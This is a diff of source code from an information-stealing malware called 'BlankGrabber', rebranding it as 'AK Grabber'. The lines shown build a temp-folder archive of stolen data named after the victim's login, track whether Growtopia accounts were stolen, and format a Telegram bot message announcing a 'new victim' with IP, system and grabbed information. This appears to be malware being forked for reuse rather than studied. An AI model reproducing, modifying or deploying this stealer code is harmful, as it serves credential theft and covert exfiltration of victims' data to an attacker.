@@ -948,7 +948,7 @@ class BlankGrabber:
     GrowtopiaStolen: bool = False # Indicates whether Growtopia account was stolen or not
 
     def __init__(self) -> None: # Constructor to call all the functions
-        self.Separator = "\n\n" + "Blank Grabber".center(50, "=") + "\n\n" # Sets the value of the separator
+        self.Separator = "\n\n" + "AK Grabber".center(50, "=") + "\n\n" # Sets the value of the separator
         
         while True:
             self.ArchivePath = os.path.join(os.getenv("temp"), Utility.GetRandomString() + ".zip") # Sets the archive path
@@ -1616,7 +1616,7 @@ class BlankGrabber:
         if not os.path.isfile(self.ArchivePath):
             raise FileNotFoundError("Failed to create archive")
         
-        filename = "Blank-%s.%s" % (os.getlogin(), extention)
+        filename = "AK-%s.%s" % (os.getlogin(), extention)
 
         computerName = os.getenv("computername") or "Unable to get computer name"
             
@@ -1719,7 +1719,7 @@ class BlankGrabber:
             
             case 1: # Telegram Bot
                 payload = {
-                    'caption': f'<b>Blank Grabber</b> got a new victim: <b>{os.getlogin()}</b>\n\n<b>IP Info</b>\n<code>{ipinfo}</code>\n\n<b>System Info</b>\n<code>{system_info}</code>\n\n<b>Grabbed Info</b>\n<code>{grabbedInfo}</code>'.strip(), 
+                    'caption': f'<b>AK Grabber</b> got a new victim: <b>{os.getlogin()}</b>\n\n<b>IP Info</b>\n<code>{ipinfo}</code>\n\n<b>System Info</b>\n<code>{system_info}</code>\n\n<b>Grabbed Info</b>\n<code>{grabbedInfo}</code>'.strip(), 
                     'parse_mode': 'HTML'
                 }
 
